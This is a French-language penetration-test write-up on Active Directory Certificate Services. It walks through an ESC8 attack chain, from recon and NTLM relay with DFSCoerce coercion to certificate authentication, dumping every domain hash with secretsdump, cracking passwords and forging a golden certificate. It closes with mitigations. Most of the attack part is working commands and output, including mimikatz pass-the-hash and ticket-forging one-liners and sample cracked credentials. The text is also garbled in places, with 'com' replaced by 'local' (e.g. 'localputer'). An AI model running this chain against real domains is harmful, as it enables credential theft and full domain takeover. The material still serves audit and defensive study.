# ADCS

## Reference

- [ESC](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.html)
- [Top 10 NSA](https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-278a)
- [AD CS Account Persistence](https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/ad-certificates/account-persistence.html#ad-cs-account-persistence)
- [Certified Pre-Owned](https://posts.specterops.io/certified-pre-owned-d95910965cd2)
- [En quoi consistent les services de certificats AD ?](https://learn.microsoft.local/fr-fr/windows-server/identity/ad-cs/active-directory-certificate-services-overview)
- [Authentification utilisateur NTLM](https://learn.microsoft.local/fr-fr/troubleshoot/windows-server/windows-security/ntlm-user-authentication)

## Rappel

![ADCS](img/image.png)

### Mot clef 

#### PKI
- **PKI** (Public Key Infrastructure) : Système de gestion des certificats et du chiffrement par clé publique.
- **DC** : Domain Controler
- **AD CS** (Active Directory Certificate Services) : Implémentation PKI de Microsoft pour gérer les certificats dans un domaine AD.
- **CA** (Certificate Authority) : tiers de confiance permettant d'authentifier l'identité des correspondants. Une autorité de certification délivre des certificats décrivant des identités numériques.
- **EnterpriseCA** : CA intégré à AD, offrant des certificate templates pour des attributions automatisées.
- **CSR** (Certificate Signing Request) : Requête envoyée à une CA pour obtenir un certificat signé.
- **Certificate Template** : Ensemble de règles définissant le contenu et les usages des certificats émis.

| **Template**            | **Usage**                                        | **Intérêt stratégique pour un attaquant** |
|-------------------------|------------------------------------------------|------------------------------------------|
| **Domain Controller**   | Authentification des contrôleurs de domaine      | ⚠️⚠️⚠️⚠️ **Critique** - localpromission = accès total à l’AD, permet d’émettre d’autres certificats malveillants. |
| **Enrollment Agent**    | Délivrance de certificats pour d'autres utilisateurs | ⚠️⚠️⚠️⚠️ **Critique** - Permet d’émettre des certificats pour n’importe quel utilisateur ou machine, facilitant des attaques de persistance. |
| **localputer**            | Authentification des machines dans AD           | ⚠️⚠️⚠️ **Élevé** - Peut être utilisé pour usurper une machine et établir des connexions sécurisées frauduleuses. |
| **User**                | Authentification des utilisateurs                | ⚠️⚠️⚠️ **Élevé** - Permet d’accéder aux ressources localme si l’attaquant était un utilisateur légitime. |
| **EFS Recovery Agent**  | Déchiffrement des fichiers chiffrés avec EFS     | ⚠️⚠️⚠️ **Élevé** - Peut être exploité pour lire des fichiers protégés sur un système. |
| **RAS and IAS Server**  | Authentification pour VPN et réseau 802.1X      | ⚠️⚠️ **Élevé** - Peut permettre un accès distant non autorisé aux réseaux de l’entreprise. |
| **Code Signing**        | Signature de code exécutable                     | ⚠️⚠️ **Élevé** - Permet de signer du code malveillant pour contourner les protections de sécurité Windows. |
| **Web Server**          | Sécurisation des localmunications (HTTPS)         | ⚠️ **Moyen** - Peut être utilisé pour intercepter et usurper des connexions sécurisées via un MITM. |
| **IPSec (Offline Request)** | Authentification IPSec pour VPNs sécurisés   | ⚠️ **Moyen** - Peut être exploité pour s’infiltrer dans des connexions chiffrées sans être détecté. |
| **Smartcard Logon**     | Authentification par carte à puce                | ⚠️ **Moyen** - Peut être utilisé pour générer des cartes à puce virtuelles pour contourner l’authentification MFA. |

#### Protocole Windows

- **NTLM (NT LAN Manager)** est un protocole d’authentification propriétaire de Microsoft utilisé avant l’adoption de Kerberos
    - Relay Attack : Un attaquant peut capturer un challenge NTLM et le relayer à un autre service pour obtenir un accès légitime.
        2.	Démarre un serveur SMB relay qui écoute les connexions.
        2.	Le serveur capture une authentification NTLM légitime d’une machine ou d’un utilisateur.
        3.	Le NTLM relay est utilisé pour relayer les identifiants NTLM vers AD CS pour obtenir un certificat.
        4.	Si AD CS est mal configuré (ESC8 ou ESC11), il délivre un certificat.
        5.	L’attaquant utilise ce certificat pour demander un TGT puis un TGS et localpromettre l'AD.
    - Pas de protection contre le “pass-the-hash” : Si un attaquant vole un hash NTLM, il peut directement s’authentifier en l’utilisant.
        - `mimikatz.exe "sekurlsa::pth /user:my-ad-02$ /domain:$DOMAIN /ntlm:aaaaaaaaaaaaaaaaaaaaaaa"`
        - `pth-winexe -U '$DOMAIN/my-ad-02$%aaaaaaaaaaaaaaaaaaaaaaaf' //192.168.1.20 cmd.exe`
- **Kerberos** est un protocole d’authentification réseau basé sur des tickets, permettant une connexion sécurisée sans transmettre de mots de passe en clair.
- **PKINIT** : extension au protocole Kerberos permettant d’authentifier un utilisateur avec un certificat, au lieu d’un mot de passe.
- **MS-DFSNM** : Protocole utilisé par Microsoft pour administrer les configurations DFS
- **DFS** : service de Microsoft Windows qui permet d’organiser et de gérer des partages de fichiers sur plusieurs serveurs tout en offrant une vision unifiée à l’utilisateur

#### Auth

- **TGT** (Ticket-Granting Ticket) est un ticket délivré par le KDC (Key Distribution Center) qui permet à un utilisateur de demander d’autres tickets pour accéder aux services du réseau sans devoir se réauthentifier
- **TGS** (Ticket-Granting Service) est un ticket spécifique à un service qui permet à un utilisateur d’accéder à une ressource précise sans devoir fournir son mot de passe.
- **PAC** (Privileged Attribute Certificate) est une extension des tickets Kerberos utilisée par Windows AD pour stocker des informations sur les privilèges et l’identité d’un utilisateur.
Il est ajouté aux tickets Kerberos TGT (Ticket-Granting Ticket) et TGS (Ticket-Granting Service) afin de permettre aux services et aux systèmes Windows de vérifier les droits de l’utilisateur sans interroger continuellement le contrôleur de domaine (DC).
    - Golden Ticket (Falsification du PAC)
        - Un attaquant ayant accès à la clé de chiffrement de Kerberos (krbtgt) peut forger un PAC avec tous les privilèges.
        - Cela permet de générer un TGT valide pour n’importe quel utilisateur, avec des droits d’administrateur du domaine.
        - Il peut ensuite obtenir un accès illimité à l’Active Directory.
        - `mimikatz.exe "kerberos::golden /domain:corp.local /sid:S-1-5-21-xxxx /krbtgt:HASH /user:Administrator /id:500 /groups:512,518,519,520 /ptt"`
    Silver Ticket (Falsification d’un PAC sur un TGS)
	    - Plutôt que de modifier un TGT, l’attaquant crée un TGS falsifié pour un service spécifique (ex: SMB, HTTP).
	    - Il insère un PAC modifié dans le ticket pour s’attribuer des droits élevés.
        - `mimikatz.exe "kerberos::golden /user:Administrator /domain:corp.local /sid:S-1-5-21-xxxx /target:server.corp.local /service:cifs /rc4:HASH /ptt"`
- **LM Hash** (Legacy, souvent vide ou fixe)
- **NT Hash** l’empreinte MD4 du mot de passe d’un localpte dans Active Directory avec 

- **PTH** (Pass-the-Hash) : Exploite un hash NTLM volé pour s’authentifier sur un système sans avoir besoin du mot de passe en clair.
    - Windows accepte les NTLM hashes localme alternative aux mots de passe pour l’authentification réseau.
    - Cette attaque bypass l’authentification interactive en injectant directement le NTLM hash au lieu d’un mot de passe.

- **PTT** (Pass-the-Ticket) : Utilise un ticket Kerberos volé (TGT ou TGS) pour accéder aux ressources réseau en usurpant l’identité d’un utilisateur légitime.

### Impacte

- Persistance machine ou utilisateur (1 an +)
    - Vol d’un certificat système permettant à un attaquant de s’authentifier en tant que machine ou utilisateur sur un domaine. 
    - Persiste après un changement de mot de passe et ne nécessite aucun accès à LSASS.
- Chemins d’escalade de domaine
    - Exploitation de templates de certificats mal configurés (ex. SAN modifiable) pour obtenir des privilèges plus élevés sur le domaine.
- Persistance de domaine
    - Vol de la clé privée de l’Autorité de Certification (CA) pour forger des certificats “golden”, assurant un accès furtif et persistant au domaine.

![alt text](img/image.png)

### Permission nécessaire 

Permission nécessaire : utilisateur avec un droit minimal, membre du groupe 'utilisateurs du domaine'

## ESC8

### Résumé de l'attaque 

![alt text](img/image-2.png)

- [Vidéo ESC8 : Manual + auto](https://www.youtube.local/watch?v=QUTXge-9lRo)
- [ECS8 explained hacktrix](https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/ad-cs-abuse/esc8)
- [Boite à outils utilisé](https://exegol.readthedocs.io/en/latest/exegol-image/tools.html)

### Recon

Un utilisateur sur le domaine est nécessaire pour effectué la suite. (Dans la suite de cette audit nous avons trouvé plus de 10 users avec des mot de passe effroyable, donc pas bien, localpliqué)

#### Bloodhound

```bash
mkdir LDAP 
neo4j start
rusthound -d "$DOMAIN" -u "$USER"@"$DOMAIN" -p "$PASSWORD" --zip --ldaps --adcs --old-bloodhound
unzip *.zip && bloodhound-import -du neo4j -dp exegol4thewin *.json
bloodhound &> /dev/null &
```

Bloodhound Cypher query : 

    MATCH (n:GPO {type: 'Enrollment Service', 'Web Enrollment':'Enabled'}) RETURN n

#### Certipy

```bash
certipy find -enabled -u "$USER@$DOMAIN" -p "$PASSWORD" 

Certificate Authorities
  0
    CA Name                             : RootCA
    DNS Name                            : my-ad-01.office.domain.local
    Certificate Subject                 : CN=RootCA, DC=office, DC=domain, DC=local
    Certificate Serial Number           : 71A63860C3F7A2B7444902C316B43573
    Certificate Validity Start          : 2017-05-15 20:04:46+00:00
    Certificate Validity End            : 2027-05-15 20:13:06+00:00
    Web Enrollment                      : Enabled [!] Vunérable ESC8
    User Specified SAN                  : Enabled 
    Request Disposition                 : Issue [!] Vunérable ESC8
```

#### OpenSSL

```bash
openssl s_client -connect "$DC_IP:636" -debug

Certificate chain
 0 s:
   i:DC = local, DC = domain, DC = office, CN = RootCA
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
   v:NotBefore: Feb 20 06:11:14 2025 GMT; NotAfter: Feb 20 06:11:14 2026 GMT
---
Server certificate
-----BEGIN CERTIFICATE-----
sXb9+MQf3cKEALY+MQf3cKEALYiFmBGVsXsXb9+MQf3cKEALYb9+MQsXb9KEALYF
ADBTMRMsXb9+MQf3cKEALYdsXb9+MQf3cKEALYYKCZImiZPyLGQBGRYEbGRsYzEV
[...]
MBMGCgmSsXb9+MQf3cKEALYsXb9+MQf3cKEALYffrwZSb290Q0EwHhcNMjUwMjIw
sXb9+MQf3cKsEALY3bsXb9+MQf3cKEALYsXb9+MQd3cKEALYf3cKEALYOosXb+dd
1+nP2JhSA1S2twg=
-----END CERTIFICATE-----
subject=
issuer=DC = local, DC = domain, DC = office, CN = RootCA
---
No client certificate CA names sent
Client Certificate Types: RSA sign, DSA sign, ECDSA sign
Requested Signature Algorithms: RSA+SHA256:RSA+SHA384:RSA+SHA1:ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA1:DSA+SHA1:RSA+SHA512:ECDSA+SHA512
Shared Requested Signature Algorithms: RSA+SHA256:RSA+SHA384:ECDSA+SHA256:ECDSA+SHA384:RSA+SHA512:ECDSA+SHA512
Peer signing digest: SHA256
Peer signature type: RSA
Server Temp Key: ECDH, secp384r1, 384 bits
---
SSL handshake has read 2097 bytes and written 467 bytes
Verification error: unable to verify the first certificate
---
New, TLSv1.2, Cipher is ECDHE-RSA-AES256-GCM-SHA384
Server public key is 2048 bit
Secure Renegotiation IS supported
localpression: NONE
Expansion: NONE
No ALPN negotiated
SSL-Session:
    Protocol  : TLSv1.2
    Cipher    : ECDHE-RSA-AES256-GCM-SHA384
    Session-ID: 6A0C000KUVDGVKUVLSBUS%AMJPZ90288EIOSJNF21CD1F147545D5A01DD135
    Session-ID-ctx: 
    Master-Key: 81A8B8C94LKDJHBLDJBLDKMJMDFKJFNMFK96ECE1ECD5CFAB4285AEE9B80744A
    PSK identity: None
    PSK identity hint: None
    SRP username: None
    Start Time: 1740045190
    Timeout   : 7200 (sec)
    Verify return code: 21 (unable to verify the first certificate)
    Extended master secret: yes
```

#### Curl

```bash
curl -I  "http://$DC_IP/certsrv/certfnsh.asp"
HTTP/1.1 401 Unauthorized
Content-Length: 1384
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
X-Powered-By: ASP.NET
Date: Mon, 17 Feb 2058 16:10:26 GMT
```

### Exploitation 

#### 1. Création du listener NTLM

```bash
certipy relay -target "http://$DC_IP/certsrv/certfnsh.asp" -ca "$DC_HOST" -template "DomainController"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://192.168.0.4/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[ ] officedomain\MY-AD01$
[*] Requesting certificate for 'officedomain\\MY-AD01$' based on the template 'DomainController'
```

#### 2. NTLM Auth Coercion via MS-DFSNM

Cela consiste à forcer un localpte machine AD à s’authentifier auprès de mon listenner, exploitant l’appel RPC `NetrDfsRemoveStdRoot()` via l’interface MS-DFSNM (Distributed File System Namespace Management Protocol). 

En modifiant l’adresse distante dans les appels RPC permettant d'administrer les configurations DFS (Distributed File System), la machine cible va s’authentifier involontairement vers l’attaquant. Ne fonctionne que contre des DC.

```bash
dfscoerce.py -d "$DOMAIN" -u "$USER" -p "$PASSWORD" "$NTLM_LISTERNER_IP" "$DC_HOST"
[-] Connecting to ncacn_np:my-ad-02.office.domain.local[\PIPE\netdfs]
[+] Successfully bound!
[-] Sending NetrDfsRemoveStdRoot!

NetrDfsRemoveStdRoot 
ServerName:                      '192.168.1.1\x00' 
RootShare:                       'test\x00' 
ApiFlags:                        1 
```

- L'AD répond en envoyant son authentification NTLM à l’attaquant (Listener).
- L’attaquant relaye cette authentification NTLM vers l'ADCS

#### 3. Réception du certificat sur le listener

![alt text](img/image-1.png)

```bash
certipy relay -target "http://$DC_IP/certsrv/certfnsh.asp" -ca "$DC_HOST" -template "DomainController"
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting http://192.168.0.4/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[ ] officedomain\MY-AD01$
[*] Requesting certificate for 'officedomain\\MY-AD01$' based on the template 'DomainController'

[*] Got certificate with DNS Host Name 'my-ad-02.office.domain.local'
[*] Certificate object SID is 'S-1-5-21-222222-11111111-3333333-6144607'
[*] Saved certificate and private key to 'my-ad-02.pfx'
[*] Exiting...
```

Certipy relay permet
1.	Capture et relaye les identifiants NTLM.
2.	Envoie une requête authentifiée à AD CS pour obtenir un certificat.
3.	Stocke le certificat si l’opération réussit.

```bash
ls -lah 
total 8.0K
drwxrwx--- 1 root root  128 Feb 17 22:17 .
drwxrwx--- 1 root root  480 Feb 17 22:17 ..
-rw-rw---- 1 root root 1.6K Feb 17 17:25 my-ad-02.ccache
-rw-rw---- 1 root root 3.1K Feb 17 17:24 my-ad-02.pfx
```

Pour utilisé le ticket TGT que nous venons d'obtenir nous devons l'exporté en tant que variable d'environnement utilisable pour des attaques Pass-the-Ticket (PTT).

```bash
export KRB5CCNAME=my-ad-02.ccache
```

#### 4. Authentification avec le certificat

```bash
certipy auth -pfx my-ad-02.pfx -dc-ip $DC_IP
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Using principal: my-ad-02$@office.domain.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'my-ad-02.ccache'
[*] Trying to retrieve NT hash for 'my-ad-02$'
[*] Got hash for 'my-ad-02$@office.domain.local': aaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbbbbbbbbbb
```

- Étape 1 : Chargement du Certificat PFX
- Étape 2 : Construction de la requête PKINIT
- Étape 3 : Demande d’un Ticket Granting Ticket (TGT)
    - Req Kerberos AS-REQ au DC.
	- Si l’utilisateur est autorisé, le DC renvoie un TGT.
    - Le ticket Kerberos renvoyé contient des PAC (Privileged Attribute Certificate) avec des NT Hashes.

#### 5. Exploitation de la réplication AD pour dump les hash du domaines

![PrivEscAsService](img/image-2.png)

```bash
secretsdump.py -pwd-last-set -history -user-status -just-dc -outputfile hash-all.txt -hashes 'aaaaaaaaaaaaaaaaaaaaaaaaa:bbbbbbbbbbbbbbbbbbbbbbbb' 'my-ad-02$@my-ad-02.office.domain.local'
```

Nous avons à cette étape les hashs de tout les utilisateurs du domaine en `AES256-CTS-HMAC-SHA1-96`, `AES128-CTS-HMAC-SHA1-96`, `DES-CBC-MD5`, `NT Hash`.

```hash
[...]
domain.local\p.nom:47776:lmlmlmlmlmlmlmlmlmlmlmlm:ntntntntntntntntntnt:::  (pwdLastSet=2025-02-01 02:31) (status=Enabled)
domain.local\p.nom:aes128-cts-hmac-sha1-96:afafafafafafafafafafafafafafa
domain.local\p.nom:aes256-cts-hmac-sha1-96:vevevevevevevevvevevevevevevevevevevevevevevevev
domain.local\p.nom:des-cbc-md5:mdmdmdmdmdmdmd
domain.local\p.nom_history0:47776:lmlmlmlmlmlmlmlmlmlmlmlm:ntntntntntntntntntnt:::
[...]
LAPTOP-NOM$:aes128-cts-hmac-sha1-96:fafafafafafafafafafafafafafafa
LAPTOP-NOM$:aes256-cts-hmac-sha1-96:evevevevevevevevvevevevevevevevevevevevevevevevev
LAPTOP-NOM$:des-cbc-md5:dmdmdmdmdmdmdmd
LAPTOP-NOM$:43675:lmlmlmlmlmlmlmlmlmlmlmlm:ntntntntntntntntntnt:::
[...]
```

#### 6 Crackage

- **AES256-CTS-HMAC-SHA1-96** : Chiffrement fort utilisé pour les tickets Kerberos.
- **AES128-CTS-HMAC-SHA1-96** : Moins sécurisé mais toujours utilisé.
- **DES-CBC-MD5** : Ancien algorithme, encore supporté pour des raisons de rétrolocalpatibilité.

- **LM Hash** (Legacy, souvent vide ou fixe)
- **NT Hash** l’empreinte MD4 du mot de passe d’un localpte dans Active Directory avec NTLM
    - Le NT Hash peut être utilisé pour une attaque Pass-the-Hash (PtH).
    - Il est possible de s’authentifier sur des machines Windows sans connaître le mot de passe.

- Exploite la réplication **AD (DRSUAPI - DRSGetNCChanges)** pour récupéré tous les localptes Active Directory avec leurs NTLM Hashes et clés Kerberos.
- Nécessite des permissions élevées (Replicating Directory Changes).

Ils nous est donc possible d'impersonnifier tout les utilisateurs du domaine, avec du PtH ou du PTT.

#### 6.1 Extraction des NT hash pour hashcat

on merge les hash : 

```bash
cat hash-all.txt.ntds hash-all.txt.kerberos | sort -u | tee hash.txt
[...]
cat hash.txt | wc -l
# 18468
```

On filtre avec awk les NT hash.

```bash
cat hash.txt | grep Enabled | awk -F ":" '{print $4}' | sort -u | tee NT.txt
[...]
cat NT.txt | wc -l
# 3142
```

#### 6.2 Extraction des utilisateurs

```bash
cat hash.txt | awk -F ":" '{print $1}' | grep -v hist | sed 's|.*\\||' | grep -v '\$$' | sort -u | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
cat 20240912172857_users.json | jq -r '.. | .displayname? // empty' | sed 's/[^a-zA-Z0-9]/\n/g' | tr 'A-Z' 'a-z' | sort -u
```

#### 6.3 Extraction de mot clef à partir des nom de machines

```bash
cat hash.txt | awk -F ":" '{print $1}' | grep -v "hist" | sed 's|.*\\||' | grep '\$$' | tr '-' '\n' | tr -d '$' |  tr '[:upper:]' '[:lower:]' | sort -u | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
cat hash.txt | awk -F ":" '{print $1}' | grep -v "hist" | sed 's|.*\\||' | grep '\$$' | tr -d '$' | sort -u | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
```


#### 6.4 Ajout de wordlist connue

```bash
cat /opt/seclists/Passwords/Leaked-Databases/alleged-gmail-passwords.txt | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
cat /opt/seclists/Passwords/richelieu-french-top20000.txt | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
cat /opt/seclists/Passwords/Leaked-Databases/fortinet-2021_passwords.txt | anew /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt
```

#### 6.5 Ajout des mot clefs des domaines et chat-gpt et boutique  

```chatgpt
Je veux que tu me génères un script python/bash qui me realise cela : 

[LISTE DES VILLE AVEC UNE PRESENSE G2OGRAPHIQUE DE L4ENTREPRISE]

1️⃣ Noms de villes françaises, sans accents, en minuscule, avec un - à la place des espaces.
2️⃣ Codes postaux associés à ces villes, chacun sur une ligne séparée.
4️⃣ Variations de mots-clés tech et boutique, dérivés de :
	•	Nom des entreprise dans le domaine
	•	Génère des préfixes et suffixes pertinents localme pro, tech, shop, store, plus, hub, market, compta, rh
5️⃣ Termes technique du coeur de métier qui est le : [COEUR DE METIER]
6️⃣ Acronymes basés sur ces noms, formés par les premières lettres des mots en majuscule

[LIST OF DOMAINE]
```

#### 6.6 Ajout des villes des boutiques et des code postaux


#### 6.8 Ajout de rule hashcat

```bash
hashcat --force /workspace/Interne/ADCS/Pwn/Wordlist/wordlist-custom.txt -r /opt/tools/john/run/rules/OneRuleToRuleThemAll.rule --stdout >> Interne/ADCS/Pwn/Wordlist/mega-wordlist.txt
cat /opt/rockyou.txt | anew Interne/ADCS/Pwn/Wordlist/mega-wordlist.txt
```

#### 6.4 Crackage 

```bash
hashcat -m 1000 -a 0 NT.txt /opt/rockyou.txt --force --optimized-kernel-enable
hashcat -m 1000 -a 0 NT.txt users.txt --force --optimized-kernel-enable

# Voir le résutat
hashcat -m 1000 --show NT.txt
[...]
#  e5f98b9d64ea2290b5fd242b4faa918d:Azerty01
#  32ed87bdb5fdc5e9cba88547376818d4:123456
#  17739ebab781437ee8e646e9a212e111:Lyon69009
#  9ab14788afc13c83576dfb13ac619152:Azerty123
[...]
```

#### 6.4 Mise en corélation user/password

```bash
cd ~/.exegol/workspaces/domain/Interne/ADCS/Pwn
hashcat -m 1000 --show /Users/raph/.exegol/workspaces/domain/Interne/ADCS/Pwn/Hash/NT.txt --force --optimized-kernel-enable | sort -u > Craked/hashcat-cracked.txt
awk -F: '
NR==FNR { cracked[$1]=$2; next }
$4 in cracked {
    if (cracked[$4] == "")
        print $1 ":empty";
    else
        print $1 ":" cracked[$4];
}
$4 == "31d6cfe0d16ae931b73c59d7e0c089c0" { print $1 ":empty" }
' Craked/hashcat-cracked.txt Hash/history-hash.txt.ntds | sort -u | grep -v ":empty" | anew Craked/localbo-list.txt

[...]
# bite.local\validation:Azerty1
# domain.local\f.office:AZerty1
# office.domain.local\warmachine:123456
# office.domain.local\uuuuu:123456
[...]
```

#### 6.5 Test d'auth sur le domaine


```bash
awk -F: '{print "nxc smb $DC_IP -u \x27"$1"\x27 -p \x27"$2"\x27 -d $DOMAIN"}' user-password.txt 

[...]
# nxc smb $DC_IP -u 'office.domain.local\warmachine' -p '123456' -d $DOMAIN
# nxc smb $DC_IP -u 'office.domain.local\z-4195' -p '123456' -d $DOMAIN
[...]
```

#### 6.6 Filter enable only

![alt text](img/bbbb.png)

```plain-text
[...]
```

![alt text](img/aaaaa.png)

#### 6. Golden Certificate

![Super CA](img/ca.png)

```bash
certipy ca -backup -u 'khal.drogo'@'essos.local' -p 'horse' -target "$DC_IP" -ca 'ESSOS-CA'
certipy forge -ca_pfx ca.pfx -upn "Administrateur@$DOMAIN" -out admin_forged.pfx
```
![alt text](img/image23.png)

1.	L’attaquant récupère un backup de la CA d’Active Directory.
2.	Il forge un nouveau certificat avec avec des identifiants falsifiés (UPN, DNS, SID).
3.	Il signe le certificat avec la clé privée du CA localpromis, ce qui le rend légitime aux yeux de Kerberos et Active Directory.
4.	Il utilise ce certificat pour s’authentifier via PKINIT, obtenant un TGT sans mot de passe.
5.	Il peut réutiliser ce certificat indéfiniment.

**Difficile à révoquer**, sauf si le certificat CA est invalidé.  

| **Nom de l'Attaque**     | **Principe**                                           | **Persistance**      | **Détection**              |
|--------------------------|------------------------------------------------------|---------------------|----------------------------|
| **Golden Certificate**   | Forge un **certificat AD CS valide** pour obtenir un TGT | ✅ Très élevée *(tant que le CA est valide)* | Difficile *(PKINIT peu logué, Event ID 4769 requis)* |
| **Golden Ticket**        | Forge un **TGT Kerberos** avec le localpte `krbtgt`      | ✅ Élevée *(tant que `krbtgt` n’est pas reset)* | Moyen *(logs Kerberos, Event ID 4769)* |
| **Silver Ticket**        | Forge un **TGS pour un service spécifique**           | ✅ Moyen *(jusqu’à expiration du ticket)* | Facile *(TGS non vérifié par le DC)* |
| **Pass-the-Ticket**      | Réutilisation d’un **TGT/TGS volé**                    | ❌ Faible *(dépend de la durée du ticket)* | Moyen *(ticket réutilisé visible dans les logs)* |

**Aucun mot de passe localpromis** : donc pas de détection via `Event ID 4776` (NTLM) ou `Event ID 4625` (échec d’authentification).  



### Mitigation

- Désactiver l’authentification NTLM sur AD CS Web Enrollment.
- HTTPS en lui-même ne protège pas contre les attaques par relais NTLM. Ce n'est que lorsque HTTPS est couplé
avec un channel binding, les services HTTPS peuvent être protégés contre les attaques par relais NTLM.
- Restreindre l’accès au template “DomainController” aux seuls localptes autorisés.
- Activer Extended Protection for Authentication (EPA) pour empêcher NTLM relay.
- Surveiller les requêtes suspectes vers certfnsh.asp via les logs AD CS.

**Si un "Golden Certificate" est en place, voici localment s’en protéger :**
1. **Révoquer tous les certificats CA localpromis** et **générer une nouvelle paire de clés**.
2. **Désactiver PKINIT** sur les localptes sensibles (`Administrator`, `krbtgt`).
3. **Restreindre les permissions sur les modèles de certificats** dans AD CS (`Enroll`, `AutoEnroll`).
4. **Surveiller les logs PKINIT (`Event ID 4769`)** pour détecter les authentifications suspectes via certificats.
5. **Forcer la réauthentification des certificats Active Directory** et activer la validation stricte.

# Brouillon

```bash
cypher-shell -u neo4j -p exegol4thewin "MATCH (c:localputer)-[:HasSession]->(u:User) 
WITH u, c,
     left(replace(u.domain, '.', ''), size(replace(u.domain, '.', '')) - 3) AS shortDomain,
     CASE WHEN u.name CONTAINS '@' THEN split(u.name, '@')[0] ELSE u.name END AS cleanUserName,
     CASE WHEN c.name STARTS WITH u.domain + '@' THEN substring(c.name, size(u.domain) + 1) ELSE c.name END AS tempMachine
WITH u, c, shortDomain, cleanUserName,
     CASE WHEN tempMachine ENDS WITH '.' + u.domain THEN substring(tempMachine, 0, size(tempMachine) - (size(u.domain) + 1)) ELSE tempMachine END AS cleanMachine
RETURN DISTINCT shortDomain + '/' + cleanUserName + '@' + cleanMachine + '.' + u.domain AS \`User@Machine\`;"
```